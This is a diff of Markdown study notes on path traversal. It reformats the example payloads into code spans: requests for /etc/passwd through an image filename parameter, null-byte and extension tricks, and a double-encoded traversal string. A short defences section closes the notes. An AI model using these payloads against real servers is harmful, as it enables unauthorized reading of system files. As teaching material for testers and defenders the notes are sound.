@@ -18,12 +18,12 @@
 
 ## Suggestions
 - Don't always trust error messages
-  - GET /image?filename=/etc/passwd ---> "No such file"
-    - Try to add null byte
-    - Try to add null byte and extension ----> %00.png
+  - `GET /image?filename=/etc/passwd` ---> "No such file"
+    - Try to add null byte: `GET /image?filename=/etc/passwd%00`
+    - Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
 - Combine the cases:
-  - Example: ....//....//....//etc/passwd%00.jpg (strip, double-encode, null byte, whitelist exstension)
-  - %252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg
+  - Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
+  - `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`
 
 ## Defences
 - Avoid passing user-supplied input to filesystem APIs
